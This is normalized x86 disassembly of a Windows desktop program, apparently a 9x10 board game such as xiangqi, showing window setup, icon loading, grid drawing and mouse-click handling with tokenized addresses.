sub_404d60
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x210 ] eax
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x0
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
lea eax [ ebp - 0x20c ]
je r-xdata
push edi
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
mov ecx ebx
push eax
push [ ebp - 0x210 ]
call sub_404b30
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
push r--data
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
sub_404e40
push ebp
mov ebp esp
push 0xffffffff
push sub_44ce6a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_404e20
push 0x7e0
mov [ ebp - 0x4 ] 0x0
call sub_40c364
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_401290
jmp r-xdata
push 0x1
push 0x1d7b7
push rw-data
mov ecx eax
mov [ ebp - 0x4 ] 0x0
call sub_4012c0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_404ee0
push ebp
mov ebp esp
push 0xffffffff
push sub_44cea2
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x7e0
call sub_40c364
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_401290
jmp r-xdata
push 0x1
push 0x1d7b7
push rw-data
mov ecx eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_4012c0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_404f60
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x110
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
sub eax 0x1
jne r-xdata
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
cmp ax 0x1
je r-xdata
movzx eax ax
push eax
push [ ebp + 0x8 ]
call [ EndDialog@IAT ]
cmp ax 0x2
jne r-xdata
sub_404fa0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi 0x22
mov eax [ ecx ]
cdq
idiv edi
mov esi eax
cmp edx 0x1
jl r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edx 0x21
jg r-xdata
mov eax [ ecx + 0x4 ]
cdq
idiv edi
cmp edx 0x1
jl r-xdata
cmp edx 0x21
jg r-xdata
inc esi
lea edx [ eax + 0x1 ]
lea eax [ esi - 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ edx - 0x1 ]
cmp eax 0x9
ja r-xdata
lea eax [ edi - 0x21 ]
mov [ ecx ] esi
pop edi
mov [ ecx + 0x4 ] edx
pop esi
pop ebp
retn
sub_405000
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x14 ]
push ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x18 ] eax
call [ GetDC@IAT ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x2c ] eax
je r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea edi [ esi * 8 + rw-data ]
push edi
push esi
push rw-data
mov [ ebp - 0x28 ] edi
call sub_406e70
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
cmp eax 0x20
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov esi [ edi ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x34 ] eax
mov eax [ edi ]
push ebx
push [ rw-data ]
mov ebx [ rw-data ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov edi eax
mov [ rw-data ] eax
mov eax [ ebp - 0x28 ]
push rw-data
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
call sub_4075b0
xor eax eax
mov [ rw-data ] 0x20
cmp [ rw-data ] eax
sete al
mov [ rw-data ] eax
mov eax esi
shl eax 0x4
add eax esi
mov esi [ ebp - 0x2c ]
lea edx [ eax * 2 - 0x22 ]
mov eax edi
shl eax 0x4
add eax edi
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059c0
mov ecx [ ebp - 0x1c ]
shl ecx 0x4
add ecx [ ebp - 0x1c ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp - 0x18 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059c0
mov eax ebx
shl eax 0x4
add eax ebx
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x34 ]
shl eax 0x4
add eax [ ebp - 0x34 ]
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059c0
mov eax [ ebp - 0x20 ]
shl eax 0x4
add eax [ ebp - 0x20 ]
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x30 ]
shl eax 0x4
add eax [ ebp - 0x30 ]
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059c0
mov ecx [ rw-data ]
add esp 0x2c
mov eax [ ecx * 4 + r--data ]
pop ebx
cmp [ eax * 8 + rw-data ] 0x0
jne r-xdata
mov [ eax * 8 + rw-data ] 0x0
cmp [ rw-data ] ecx
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
push [ rw-data ]
mov esi [ SetCursor@IAT ]
call esi
push [ ebp - 0x24 ]
call sub_405bb0
add esp 0x4
push [ rw-data ]
call esi
sub_405270
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push 0x0
push eax
push 0x0
push 0x0
push 0x0
push 0x80000000
push 0x0
push 0x80000000
push 0xc80000
push rw-data
push rw-data
push 0x0
mov [ rw-data ] eax
call [ CreateWindowExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push [ ebp + 0xc ]
push esi
call [ ShowWindow@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov eax 0x1
pop esi
pop ebp
retn
pop esi
pop ebp
retn
sub_4052d0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push 0x6b
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_405f20
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] eax
call [ LoadIconW@IAT ]
push 0x6c
push [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rw-data
call [ LoadIconW@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
call [ RegisterClassExW@IAT ]
mov esp ebp
pop ebp
retn
sub_405350
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ LoadCursorW@IAT ]
push edi
push 0x83
push [ rw-data ]
mov [ ebp - 0x18 ] ebx
call esi
push 0x85
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x84
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov esi [ LoadIconW@IAT ]
push 0x9f
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa0
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa1
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa2
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa3
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa4
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa5
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x98
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x99
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9a
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9b
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9c
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9d
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9e
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x82
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa6
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_405800
push ebx
call [ GetDC@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
push 0x154
push 0x132
push esi
mov [ rw-data ] eax
call [ CreateCompatibleBitmap@IAT ]
push eax
push [ rw-data ]
mov [ rw-data ] eax
call [ SelectObject@IAT ]
push 0xa0d2b4
push [ rw-data ]
call sub_406590
movaps xmm0 [ r--data ]
lea eax [ ebp - 0x14 ]
add esp 0x8
movups [ ebp - 0x14 ] xmm0
push 0x1
push 0xc80000
push eax
call [ AdjustWindowRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x0
call esi
mov ecx [ ebp - 0x14 ]
sub ecx [ ebp - 0xc ]
add eax ecx
cdq
sub eax edx
mov edi eax
push 0x1
sar edi 0x1
call esi
mov ebx [ ebp - 0x10 ]
mov ecx ebx
mov esi [ ebp - 0x8 ]
sub ecx esi
add eax ecx
mov ecx [ ebp - 0xc ]
cdq
add ecx edi
sub eax edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x14 ]
sar eax 0x1
add edx edi
add ebx eax
mov [ ebp - 0x14 ] edx
add esi eax
mov [ ebp - 0x10 ] ebx
push 0x1
mov [ ebp - 0x8 ] esi
sub ecx edx
sub esi ebx
push esi
push ecx
push ebx
push edx
push [ ebp - 0x18 ]
call [ MoveWindow@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_4055b0
push ebp
mov ebp esp
sub esp 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov ecx esi
shl ecx 0x4
add ecx esi
add ecx ecx
sub edi ecx
cmp edi 0x1
jl r-xdata
pop edi
pop esi
cmp edi 0x21
jg r-xdata
mov edi [ ebp + 0x10 ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov eax ecx
shl eax 0x4
add eax ecx
add eax eax
sub edi eax
cmp edi 0x1
jl r-xdata
cmp edi 0x21
jg r-xdata
lea edx [ esi + 0x1 ]
lea eax [ edx - 0x1 ]
lea esi [ ecx + 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x9
ja r-xdata
lea eax [ edx + edx * 2 ]
mov [ ebp + 0xc ] edx
lea eax [ esi + eax * 4 ]
mov [ ebp + 0x10 ] esi
mov ecx [ eax * 4 + rw-data ]
xor eax eax
cmp [ rw-data ] eax
sete al
cmp [ ecx * 4 + r--data ] eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x20
je r-xdata
push ebx
push [ ebp + 0x8 ]
call [ GetDC@IAT ]
mov ecx [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] 0x0
cmp ecx 0x20
je r-xdata
push esi
push edx
push eax
push [ ebp + 0x8 ]
call sub_405000
add esp 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov esi [ ecx * 8 + rw-data ]
mov edi [ ecx * 8 + rw-data ]
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
pop ebx
push edi
push esi
push ebx
call sub_405950
add esp 0xc
mov eax [ ebp + 0xc ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x10 ]
lea eax [ eax + ecx * 4 ]
mov eax [ eax * 4 + rw-data ]
mov [ rw-data ] eax
push [ eax * 8 + rw-data ]
push [ eax * 8 + rw-data ]
push ebx
call sub_405950
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_405710
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov ecx esi
shl ecx 0x4
add ecx esi
add ecx ecx
sub edi ecx
cmp edi 0x1
jl r-xdata
pop edi
pop esi
pop ebp
retn
cmp edi 0x21
jg r-xdata
mov ecx [ ebp + 0xc ]
mov eax 0x78787879
imul ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
mov eax edi
shl eax 0x4
add eax edi
add eax eax
sub ecx eax
cmp ecx 0x1
jl r-xdata
cmp ecx 0x21
jg r-xdata
lea ecx [ esi + 0x1 ]
lea eax [ ecx - 0x1 ]
lea esi [ edi + 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x9
ja r-xdata
mov edx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] esi
cmp edx 0x20
je r-xdata
lea eax [ ecx + ecx * 2 ]
lea eax [ esi + eax * 4 ]
mov ecx [ eax * 4 + rw-data ]
xor eax eax
cmp [ rw-data ] eax
sete al
cmp [ ecx * 4 + r--data ] eax
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ edx * 8 + rw-data ]
push eax
push edx
push rw-data
call sub_406e70
add esp 0x10
test eax eax
je r-xdata
push [ rw-data ]
call [ SetCursor@IAT ]
pop edi
pop esi
pop ebp
retn
push [ rw-data ]
call [ SetCursor@IAT ]
sub_405800
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push 0x0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push rw-data
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push rw-data
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
mov [ rw-data ] 0x0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
call sub_4075b0
add esp 0xc
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x20
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
retn
sub_405950
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
shl ecx 0x4
add ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp + 0x10 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059c0
mov ecx [ ebp - 0x4 ]
add esp 0x8
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_4059c0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
movaps xmm0 [ r--data ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] ebx
push eax
push eax
movups [ ebp - 0x14 ] xmm0
call [ IntersectRect@IAT ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
push 0xcc0020
push edx
push ecx
push [ rw-data ]
sub eax edx
push eax
mov eax [ ebp - 0xc ]
sub eax ecx
push eax
push edx
push ecx
push ebx
call [ BitBlt@IAT ]
mov eax 0x78787879
imul [ ebp - 0x10 ]
mov eax 0x78787879
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
imul [ ebp - 0xc ]
mov eax 0x78787879
mov [ ebp - 0x30 ] edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
imul [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x24 ] eax
mov eax 0x78787879
imul [ ebp - 0x14 ]
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp esi ecx
jg r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub [ ebp - 0x18 ] esi
lea ebx [ esi + 0x1 ]
mov eax esi
shl eax 0x4
add eax esi
lea ecx [ eax * 2 + 0x1 ]
lea eax [ esi + esi * 2 ]
mov [ ebp - 0x1c ] ecx
mov esi [ ebp - 0x18 ]
lea eax [ edi + eax * 4 ]
lea edx [ eax * 4 + rw-data ]
inc esi
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x18 ] esi
add edx 0x30
add ecx 0x22
inc ebx
mov [ ebp - 0x2c ] edx
sub esi 0x1
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] esi
jne r-xdata
mov eax edi
lea esi [ edi + 0x1 ]
shl eax 0x4
add eax edi
lea edi [ eax * 2 + 0x1 ]
mov eax edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x30 ]
inc edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x34 ] edx
nop [ eax ] eax
cmp edi eax
jg r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ eax * 4 + r--data ]
push [ eax * 4 + rw-data ]
push edi
push ecx
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
mov ecx [ ebp - 0x1c ]
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0x20
je r-xdata
cmp [ rw-data ] esi
jne r-xdata
push [ rw-data ]
push edi
push ecx
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
mov eax [ ebp - 0x28 ]
inc esi
mov ecx [ ebp - 0x1c ]
add eax 0x4
add edi 0x22
mov [ ebp - 0x28 ] eax
sub [ ebp - 0x34 ] 0x1
jne r-xdata
cmp [ eax * 8 + rw-data ] ebx
jne r-xdata
mov eax [ eax ]
cmp eax 0x20
je r-xdata
mov edi [ ebp - 0x30 ]
mov edx [ ebp - 0x2c ]
mov esi [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
cmp [ eax * 8 + rw-data ] esi
jne r-xdata
push [ rw-data ]
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
sub_405bb0
push ebp
mov ebp esp
sub esp 0x354
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov ecx 0x40
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x354 ] eax
lea edi [ ebp - 0x104 ]
lea eax [ ebp - 0x338 ]
mov [ ebp - 0x350 ] ebx
push eax
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x330 ] 0x20
push eax
lea eax [ ebp - 0x354 ]
mov [ ebp - 0x338 ] 0x0
push eax
mov esi rw-data
mov [ ebp - 0x334 ] 0x0
[ edi ] [ esi ]
lea eax [ ebp - 0x104 ]
mov ecx 0x84
push eax
lea eax [ ebp - 0x314 ]
mov esi rw-data
lea edi [ ebp - 0x314 ]
[ edi ] [ esi ]
push eax
call sub_40c060
add esp 0x14
test eax eax
je r-xdata
mov [ rw-data ] 0x1
mov eax [ ebp - 0x338 ]
mov esi [ ebp - 0x330 ]
mov [ ebp - 0x32c ] eax
mov eax [ ebp - 0x334 ]
push ebx
mov [ ebp - 0x328 ] eax
call [ GetDC@IAT ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x340 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x32c ]
push eax
lea edi [ esi * 8 + rw-data ]
push edi
push esi
push rw-data
mov [ ebp - 0x348 ] edi
call sub_406e70
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x32c ]
mov edx [ ebp - 0x328 ]
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
cmp eax 0x20
je r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ rw-data ]
mov ebx [ rw-data ]
mov [ ebp - 0x34c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x33c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x344 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov edi eax
mov [ rw-data ] eax
mov eax [ ebp - 0x348 ]
push rw-data
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
call sub_4075b0
xor eax eax
mov [ rw-data ] 0x20
cmp [ rw-data ] eax
sete al
mov [ rw-data ] eax
mov eax esi
shl eax 0x4
add eax esi
mov esi [ ebp - 0x340 ]
lea edx [ eax * 2 - 0x22 ]
mov eax edi
shl eax 0x4
add eax edi
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059c0
mov ecx [ ebp - 0x32c ]
shl ecx 0x4
add ecx [ ebp - 0x32c ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp - 0x328 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp - 0x328 ]
mov [ ebp - 0x31c ] eax
mov [ ebp - 0x324 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059c0
mov eax ebx
shl eax 0x4
add eax ebx
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x344 ]
shl eax 0x4
add eax [ ebp - 0x344 ]
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059c0
mov eax [ ebp - 0x34c ]
shl eax 0x4
add eax [ ebp - 0x34c ]
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x33c ]
shl eax 0x4
add eax [ ebp - 0x33c ]
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059c0
mov ecx [ rw-data ]
add esp 0x2c
mov eax [ ecx * 4 + r--data ]
cmp [ eax * 8 + rw-data ] 0x0
je r-xdata
mov [ eax * 8 + rw-data ] 0x0
cmp [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push [ rw-data ]
mov esi [ SetCursor@IAT ]
call esi
push [ ebp - 0x350 ]
call sub_405bb0
add esp 0x4
push [ rw-data ]
call esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_405f20
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0xcc ]
push 0x64
push eax
push 0x6a
push [ rw-data ]
call [ LoadStringW@IAT ]
mov ecx [ ebp + 0xc ]
cmp ecx 0x111
ja r-xdata
mov eax ecx
sub eax 0x200
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
movzx ecx ax
shr eax 0x10
push eax
push ecx
call sub_405710
sub eax 0x1
je r-xdata
mov ecx [ ebp + 0x10 ]
movzx eax cx
cmp eax 0x8004
jg r-xdata
mov eax ecx
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x14 ]
movzx ecx ax
shr eax 0x10
push eax
push ecx
push edi
call sub_4055b0
add esp 0xc
xor eax eax
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push ecx
push edi
call [ DefWindowProcW@IAT ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
cmp eax 0x8005
je r-xdata
je r-xdata
push edi
call sub_405350
add esp 0x4
xor eax eax
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub eax 0x1
je r-xdata
call sub_405800
movaps xmm0 [ r--data ]
push edi
mov [ rw-data ] 0x1
movups [ ebp - 0xdc ] xmm0
call [ GetDC@IAT ]
lea ecx [ ebp - 0xdc ]
push ecx
push eax
call sub_4059c0
jmp r-xdata
push [ ebp + 0x14 ]
push ecx
push 0x111
push edi
call [ DefWindowProcW@IAT ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
call sub_405800
movaps xmm0 [ r--data ]
push edi
mov [ rw-data ] 0x0
movups [ ebp - 0xdc ] xmm0
call [ GetDC@IAT ]
lea ecx [ ebp - 0xdc ]
push ecx
